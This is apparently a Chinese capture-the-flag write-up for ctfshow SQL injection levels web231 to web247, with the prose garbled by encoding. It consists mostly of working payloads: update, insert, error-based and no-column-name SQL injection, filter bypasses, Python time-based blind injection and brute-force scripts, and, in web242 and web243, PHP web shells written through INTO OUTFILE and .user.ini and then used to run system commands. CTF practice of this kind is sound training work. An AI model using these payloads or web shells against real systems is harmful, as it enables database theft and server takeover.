<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># root@localhost</span><br><span class="line">password=1&#x27;,username=user() where id=1#&amp;username=1</span><br><span class="line"></span><br><span class="line"># ctfshow_web</span><br><span class="line">password=1&#x27;,username=database() where id=1#&amp;username=1</span><br><span class="line"></span><br><span class="line"># banlist,ctfshow_user,flaga</span><br><span class="line">password=1&#x27;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where id=1#&amp;username=1</span><br><span class="line"></span><br><span class="line"># id,flagas,info</span><br><span class="line">password=1&#x27;,username=(select group_concat(column_name) from information_schema.columns where table_name=&quot;flaga&quot;) where id=1#&amp;username=1</span><br><span class="line"></span><br><span class="line"># ctfshow&#123;29f08a27-226c-4e94-9689-ea06e7c9cd83&#125;</span><br><span class="line">password=1&#x27;,username=(select flagas from flaga) where id=1#&amp;username=1</span><br></pre></td></tr></table></figure>

<h2 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h2><p>æ”¹æˆç”¨<code>&#39;)</code>é—­åˆå³å¯ï¼Œå…¶ä»–æ­¥éª¤åŒ<code>web231</code></p>
<h2 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åˆ†é¡µæŸ¥è¯¢</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ç”¨<code>\</code>é€ƒé€¸ï¼Œä¼šæŠŠç¬¬ä¸€ä¸ª<code>&#39;</code>æ³¨é‡Šæ‰ï¼Œå˜æˆä¸‹é¢è¿™ç§è¯­å¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update ctfshow_user set pass = &#x27;\&#x27; where username = &#x27;,username=(select database()) where id=1&#x27;;</span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆ<code>payload</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ•°æ®åº“ ctfshow_web</span><br><span class="line">username=,username=(select database()) where id=1#&amp;password=\</span><br><span class="line"></span><br><span class="line"># è¡¨å banlist,ctfshow_user,flag233333</span><br><span class="line">username=,username=(select group_concat(table_name)from information_schema.tables where table_schema=database()) where id=1#&amp;password=\</span><br><span class="line"></span><br><span class="line"># åˆ—å id,flagass233,info</span><br><span class="line">username=,username=(select group_concat(column_name)from information_schema.columns where table_name=&#x27;flag233333&#x27;) where id=1#&amp;password=\</span><br><span class="line"></span><br><span class="line"># ctfshow&#123;55536d6e-1dc6-47dc-9a53-51b709ea4c64&#125;</span><br><span class="line">username=,username=(select flagass233 from flag233333) where id=1#&amp;password=\</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥ç›´æ¥æ—¶é—´ç›²æ³¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f920bbce-de8e-4f5a-81e6-2e859b158cad.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==l):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#æ•°æ®åº“ ctfshow_web</span></span><br><span class="line">        <span class="comment"># payload = f&quot;ascii(substr((select database()),&#123;i&#125;,1))&lt;&#123;mid&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#è¡¨å banlist,ctfshow_user,flag233333 </span></span><br><span class="line">        <span class="comment"># payload = f&quot;ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&lt;&#123;mid&#125;&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#åˆ—å id,flagass233,info</span></span><br><span class="line">        <span class="comment"># payload = f&quot;ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;flag233333&#x27;),&#123;i&#125;,1))&lt;&#123;mid&#125;&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ctfshow&#123;55536d6e-1dc6-47dc-9a53-51b709ea4c64&#125;</span></span><br><span class="line">        payload = <span class="string">f&quot;ascii(substr((select group_concat(flagass233)from flag233333),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;1&#x27; or if((<span class="subst">&#123;payload&#125;</span>),sleep(0.05),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">f&quot;1&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url=url, data=data, timeout=<span class="number">0.9</span>)</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            r = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&#x27; &#x27;</span> <span class="keyword">or</span> flag[-<span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h2><p>å•å¼•å·è¢«è¿‡æ»¤äº†ï¼Œç›´æ¥ç”¨<code>\</code>é€ƒé€¸å°±å¥½(æ‰¾åˆ—åå“ªé‡Œè¡¨åå¯ä»¥è½¬16è¿›åˆ¶æˆ–è€…ç”¨<code>&quot;</code>åŒ…è£¹)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ•°æ®åº“ ctfshow_web</span><br><span class="line">username=,username=(select database()) where id=1#&amp;password=\</span><br><span class="line"></span><br><span class="line"># è¡¨å banlist,ctfshow_user,flag23a</span><br><span class="line">username=,username=(select group_concat(table_name)from information_schema.tables where table_schema=database()) where id=1#&amp;password=\</span><br><span class="line"></span><br><span class="line"># åˆ—å id,flagass23s3,info</span><br><span class="line">username=,username=(select group_concat(column_name)from information_schema.columns where table_name=0x666C6167323361) where id=1#&amp;password=\</span><br><span class="line">username=,username=(select group_concat(column_name)from information_schema.columns where table_name=&quot;flag23a&quot;) where id=1#&amp;password=\</span><br><span class="line"></span><br><span class="line"># ctfshow&#123;adc42c34-0200-452a-b04c-dc465c05ecb2&#125;</span><br><span class="line">username=,username=(select flagass23s3 from flag23a) where id=1#&amp;password=\</span><br></pre></td></tr></table></figure>

<h2 id="web235"><a href="#web235" class="headerlink" title="web235"></a>web235</h2><p>ç¦ç”¨äº†<code>or</code>ï¼Œæ— æ³•ç”¨<code>information_schema</code>ï¼Œæ¢åˆ«çš„åº“ï¼Œç„¶åæ— æ³•è·å–åˆ—åï¼Œä½¿ç”¨<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/98206699">æ— åˆ—åæ³¨å…¥</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ•°æ®åº“ ctfshow_web</span><br><span class="line">username=,username=(select database()) where id=1#&amp;password=\</span><br><span class="line"></span><br><span class="line"># è¡¨å banlist,ctfshow_user,flag23a1,gtid_slave_pos</span><br><span class="line">username=,username=(select group_concat(table_name) from mysql.innodb_table_stats) where id=1#&amp;password=\</span><br><span class="line">username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())</span><br><span class="line"></span><br><span class="line"># ctfshow&#123;8dc6b582-bb1f-4700-8a60-59a2c552877c&#125;</span><br><span class="line">username=,username=(select `2` from(select 1,2,3 union select * from flag23a1 limit 1,1)a) where id=1#&amp;password=\</span><br><span class="line">username=,username=(select b from(select 1,2 as b,3 union select * from flag23a1 limit 1,1)a) where id=1#&amp;password=\</span><br></pre></td></tr></table></figure>

<h2 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h2><p>å¢åŠ è¿‡æ»¤äº†<code>flag</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ•°æ®åº“ ctfshow_web</span><br><span class="line">username=,username=(select database()) where id=1#&amp;password=\</span><br><span class="line"></span><br><span class="line"># è¡¨å banlist,ctfshow_user,flaga,gtid_slave_pos</span><br><span class="line">username=,username=(select group_concat(table_name) from mysql.innodb_table_stats) where id=1#&amp;password=\</span><br><span class="line">username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())</span><br><span class="line"></span><br><span class="line"># ctfshow&#123;975ab439-77ff-42fd-87be-84a13f913594&#125;</span><br><span class="line">username=,username=(select `2` from(select 1,2,3 union select * from flaga limit 1,1)a) where id=1#&amp;password=\</span><br><span class="line">username=,username=(select b from(select 1,2 as b,3 union select * from flaga limit 1,1)a) where id=1#&amp;password=\</span><br><span class="line">username=,username=(select to_base64(b) from(select 1,2 as b,3 union select * from flaga limit 1,1)a) where id=1#&amp;password=\</span><br></pre></td></tr></table></figure>

<h2 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ’å…¥æ•°æ®</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into ctfshow_user(username,pass) value(&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;);&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>insert</code>æ³¨å…¥ï¼Œé—­åˆå‰é¢çš„<code>&#39;</code>ç„¶åæ’å…¥è‡ªå·±çš„æ•°æ®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into ctfshow_user(username,pass) value(&#x27;1&#x27;,(select database());#&#x27;,&#x27;1&#x27;);</span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆ<code>payload</code>(åœ¨<code>/api/insert.php</code>é¡µé¢)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ•°æ®åº“ ctfshow_web</span><br><span class="line">username=1&#x27;,(select database()));#&amp;password=1</span><br><span class="line"></span><br><span class="line"># è¡¨å banlist,ctfshow_user,flag,gtid_slave_pos</span><br><span class="line">username=1&#x27;,(select group_concat(table_name) from mysql.innodb_table_stats));#&amp;password=1</span><br><span class="line"># banlist,ctfshow_user,flag</span><br><span class="line">username=1&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()));#&amp;password=1</span><br><span class="line"></span><br><span class="line"># åˆ—å id,flagass23s3,info</span><br><span class="line">username=1&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&quot;flag&quot;));#&amp;password=1</span><br><span class="line"></span><br><span class="line"># ctfshow&#123;0cdc4293-2484-435d-9961-4f932090a6a2&#125;</span><br><span class="line">username=1&#x27;,(select b from(select 1,2 as b,3 union select * from flag limit 1,1)a));#&amp;password=1</span><br><span class="line">username=1&#x27;,(select flagass23s3 from flag));#&amp;password=1</span><br></pre></td></tr></table></figure>

<h2 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h2><p>è¿‡æ»¤äº†<code>ç©ºæ ¼</code>ç­‰ï¼Œç”¨æ‹¬å·ç»•è¿‡å°±å¥½</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ•°æ®åº“ ctfshow_web</span><br><span class="line">username=1&#x27;,(select(database())))#&amp;password=1</span><br><span class="line"></span><br><span class="line"># banlist,ctfshow_user,flagb</span><br><span class="line">username=1&#x27;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))#&amp;password=1</span><br><span class="line"></span><br><span class="line"># åˆ—å id,flag,info</span><br><span class="line">username=1&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&quot;flagb&quot;)))#&amp;password=1</span><br><span class="line"></span><br><span class="line"># ctfshow&#123;c24af03f-76a7-4531-bfcc-fad472993e2b&#125;</span><br><span class="line">username=1&#x27;,(select(flag)from(flagb)))#&amp;password=1</span><br></pre></td></tr></table></figure>

<h2 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h2><p>åœ¨ä¸Šä¸€é¢˜åŸºç¡€ä¸Šåˆè¿‡æ»¤äº†<code>or</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ•°æ®åº“ ctfshow_web</span><br><span class="line">username=1&#x27;,(select(database())))#&amp;password=1</span><br><span class="line"></span><br><span class="line"># banlist,ctfshow_user,flagbb,gtid_slave_pos</span><br><span class="line">username=1&#x27;,(select(group_concat(table_name))from(mysql.innodb_table_stats)))#&amp;password=1</span><br><span class="line"></span><br><span class="line"># æ— åˆ—åæ²¡è¯•å‡ºæ¥ï¼ŒçŒœæµ‹åˆ—åä¸ºflag</span><br><span class="line"># ctfshow&#123;924a10ce-aa48-40cf-8805-0cd3c1ad8b41&#125;</span><br><span class="line">username=1&#x27;,(select(flag)from(flagbb)))#&amp;password=1</span><br></pre></td></tr></table></figure>

<h2 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h2><p>å¼€å±€ç»™äº†æç¤º</p>
<blockquote>
<p>Hint: è¡¨åå…±9ä½ï¼Œflagå¼€å¤´ï¼Œåäº”ä½ç”±a&#x2F;bç»„æˆï¼Œå¦‚flagabaabï¼Œå…¨å°å†™</p>
</blockquote>
<p>åœ¨ä¸Šä¸€é¢˜åŸºç¡€ä¸Šåˆç¦ç”¨äº†<code>mysql</code>ï¼Œçˆ†ç ´ä¸€ä¸‹å°±å¥½</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url_insert = <span class="string">&quot;http://472ad1c9-07cb-4687-8a5b-6d471cc8fb34.challenge.ctf.show/api/insert.php&quot;</span></span><br><span class="line">url_query = <span class="string">&quot;http://472ad1c9-07cb-4687-8a5b-6d471cc8fb34.challenge.ctf.show/api/?page=1&amp;limit=1000&quot;</span></span><br><span class="line">letters = <span class="string">&#x27;ab&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> letters:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letters:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> letters:  </span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> letters:  </span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> letters:</span><br><span class="line">                    table_name = <span class="string">&#x27;flag&#x27;</span> + i + j + k + l + m</span><br><span class="line">                    data = &#123;</span><br><span class="line">                        <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;1&#x27;,(select(flag)from(<span class="subst">&#123;table_name&#125;</span>)))#&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    r_insert = requests.post(url=url_insert,data=data)</span><br><span class="line">                    r_query = requests.get(url=url_query)</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> r_query.json()[<span class="string">&#x27;data&#x27;</span>]:</span><br><span class="line">                        <span class="keyword">if</span> <span class="string">&quot;ctfshow&#123;&quot;</span> <span class="keyword">in</span> i[<span class="string">&#x27;pass&#x27;</span>]:</span><br><span class="line">                            <span class="built_in">print</span>(i[<span class="string">&#x27;pass&#x27;</span>])</span><br><span class="line">                            sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="web241"><a href="#web241" class="headerlink" title="web241"></a>web241</h2><p>æ—¶é—´ç›²æ³¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f9c649bd-f226-4838-9cc6-b550d590337b.challenge.ctf.show/api/delete.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==l):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#æ•°æ®åº“ ctfshow_web</span></span><br><span class="line">        <span class="comment"># payload = f&quot;ascii(substr((select database()),&#123;i&#125;,1))&lt;&#123;mid&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#è¡¨å banlist,ctfshow_user,flag </span></span><br><span class="line">        <span class="comment"># payload = f&quot;ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&lt;&#123;mid&#125;&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#åˆ—å id,flag,info</span></span><br><span class="line">        <span class="comment"># payload = f&quot;ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;flag&#x27;),&#123;i&#125;,1))&lt;&#123;mid&#125;&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ctfshow&#123;00a7ac5a-fbac-4e61-b847-ba84f4699af9&#125;</span></span><br><span class="line">        payload = <span class="string">f&quot;ascii(substr((select group_concat(flag)from flag),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: <span class="string">f&quot;if((<span class="subst">&#123;payload&#125;</span>),sleep(0.05),1)#&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url=url, data=data, timeout=<span class="number">0.9</span>)</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            r = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&#x27; &#x27;</span> <span class="keyword">or</span> flag[-<span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="web242"><a href="#web242" class="headerlink" title="web242"></a>web242</h2><p>sqlè¯­å¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¤‡ä»½è¡¨</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from ctfshow_user into outfile &#x27;/var/www/html/dump/<span class="subst">&#123;$filename&#125;</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ä½¿ç”¨è¿™3ä¸ªè¯­å¥ï¼Œä½¿æŸ¥è¯¢å‡ºæ¥çš„æ•°æ®ç»“å°¾éƒ½æ·»åŠ ä¸Šè‡ªå®šä¹‰çš„å†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lines terminated by</span><br><span class="line">lines starting by</span><br><span class="line">fields terminated by</span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆ<code>payload</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=1.php&#x27; lines terminated by &#x27;&lt;?php eval($_POST[1]);phpinfo();?&gt;&#x27;#</span><br></pre></td></tr></table></figure>

<p>ç„¶åè®¿é—®<code>/dump/1.php</code>æ‰§è¡Œ<code>1=system(&quot;cat /flag.here&quot;);</code>å³å¯</p>
<h2 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h2><p>è¿‡æ»¤äº†<code>php</code>ï¼Œå¯ä»¥å…ˆä¸Šä¼ <code>.user.ini</code>ï¼Œç„¶åä¸Šä¼ å›¾ç‰‡ğŸå³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=.user.ini&#x27; lines starting by &#x27;auto_append_file=&quot;1.jpg&quot;;&#x27;#</span><br></pre></td></tr></table></figure>

<p>ä¼ ğŸ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=1.jpg&#x27; lines starting by &#x27;&lt;?=eval($_POST[1]);?&gt;&#x27;#</span><br></pre></td></tr></table></figure>

<p>ç„¶åè®¿é—®<code>/dump/index.php</code>å¹¶æ‰§è¡Œ<code>1=system(&quot;cat /flag.here&quot;);</code></p>
<h2 id="web244"><a href="#web244" class="headerlink" title="web244"></a>web244</h2><p>sqlè¯­å¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¤‡ä»½è¡¨</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>updatexml</code>æŠ¥é”™æ³¨å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ•°æ®åº“ ctfshow_web</span><br><span class="line">/api/?id=1&#x27;||updatexml(1,concat(0x7e,(select database()),0x7e),1)%23&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># è¡¨å banlist,ctfshow_flag,ctfshow_us</span><br><span class="line">/api/?id=1&#x27;||updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># åˆ—å id,flag,info</span><br><span class="line">/api/?id=1&#x27;||updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flag&#x27;),0x7e),1)%23&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># é•¿åº¦æœ‰é™åˆ¶ï¼Œæ³¨æ„åˆ†å¼€å–</span><br><span class="line"># ctfshow&#123;2295d52e-d13a-40c6-9361</span><br><span class="line">1&#x27;||updatexml(1,concat(0x7e,(select group_concat(flag) from ctfshow_flag),0x7e),1)%23&amp;page=1&amp;limit=10</span><br><span class="line">#-cdf390ded690&#125;</span><br><span class="line">/api/?id=1&#x27;||updatexml(1,concat(0x7e,(select right(group_concat(flag),14) from ctfshow_flag),0x7e),1)%23&amp;page=1&amp;limit=10</span><br><span class="line"># æ‹¼æ¥ä¸€ä¸‹å³å¯ ctfshow&#123;2295d52e-d13a-40c6-9361-cdf390ded690&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web245"><a href="#web245" class="headerlink" title="web245"></a>web245</h2><p>è¿‡æ»¤äº†<code>updatexml</code>ï¼Œä½¿ç”¨<code>extractvalue</code>æŠ¥é”™æ³¨å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ•°æ®åº“ ctfshow_web</span><br><span class="line">/api/?id=1&#x27;||extractvalue(0x0a,concat(0x0a,(select database())))%23&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># è¡¨å banlist,ctfshow_flagsa,ctfshow_</span><br><span class="line">/api/?id=1&#x27;||extractvalue(0x0a,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema=database())))%23&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># åˆ—å id,flag1,info</span><br><span class="line">/api/?id=1&#x27;||extractvalue(0x0a,concat(0x0a,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagsa&#x27;)))%23&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># é•¿åº¦æœ‰é™åˆ¶ï¼Œæ³¨æ„åˆ†å¼€å–</span><br><span class="line"># ctfshow&#123;3c98930a-4ff1-4074-bd56</span><br><span class="line">/api/?id=1&#x27;||extractvalue(0x0a,concat(0x0a,(select group_concat(flag1) from ctfshow_flagsa)))%23&amp;page=1&amp;limit=10</span><br><span class="line"># -98413a509601&#125;</span><br><span class="line">/api/?id=1&#x27;||extractvalue(0x0a,concat(0x0a,(select right(group_concat(flag1),14) from ctfshow_flagsa)))%23&amp;page=1&amp;limit=10</span><br><span class="line"># æ‹¼æ¥ä¸€ä¸‹å³å¯ ctfshow&#123;3c98930a-4ff1-4074-bd56-98413a509601&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web246"><a href="#web246" class="headerlink" title="web246"></a>web246</h2><p>åœ¨ä¸Šä¸€å…³åŸºç¡€ä¸Šåˆè¿‡æ»¤äº†<code>extractvalue</code>ï¼Œä½¿ç”¨<code>floor</code>æŠ¥é”™æ³¨å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ•°æ®åº“ ctfshow_web</span><br><span class="line">/api/?id=1&#x27; union select 1,count(*),concat(0x3a,0x3a,(select database() limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># è¡¨å ctfshow_flags</span><br><span class="line">/api/?id=</span><br><span class="line">1&#x27; union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># åˆ—å flag2</span><br><span class="line">/api/?id=</span><br><span class="line">1&#x27; union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name=&#x27;ctfshow_flags&#x27; limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># ctfshow&#123;2aac7541-6f66-4780-8a44-e8cfa45e1842&#125;</span><br><span class="line">/api/?id=</span><br><span class="line">1&#x27; union select 1,count(*),concat(0x3a,0x3a,(select flag2 from ctfshow_flags limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<h2 id="web247"><a href="#web247" class="headerlink" title="web247"></a>web247</h2><p>åœ¨ä¸Šä¸€å…³åŸºç¡€ä¸Šåˆè¿‡æ»¤äº†<code>floor</code>ï¼Œä½¿ç”¨å…¶ä»–æ•°å­¦å‡½æ•°</p>
<blockquote>
<p>round ceil floor</p>
</blockquote>
<p>æ¢æˆ<code>ceil</code>å³å¯ï¼Œæ³¨æ„è¿™ä¸€æ¬¡åˆ—åæ¯”è¾ƒç‰¹æ®Šï¼Œè¦ç”¨åå¼•å·åŒ…è£¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ•°æ®åº“ ctfshow_web</span><br><span class="line">/api/?id=1&#x27; union select 1,count(*),concat(0x3a,0x3a,(select database() limit 1,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># è¡¨å ctfshow_flagsa</span><br><span class="line">/api/?id=</span><br><span class="line">1&#x27; union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># åˆ—å flag?</span><br><span class="line">/api/?id=</span><br><span class="line">1&#x27; union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagsa&#x27; limit 1,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># ctfshow&#123;f2cfa4cb-9474-422b-9869-1254c8381897&#125;</span><br><span class="line">/api/?id=</span><br><span class="line">1&#x27; union select 1,count(*),concat(0x3a,0x3a,(select `flag?` from ctfshow_flagsa limit 0,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

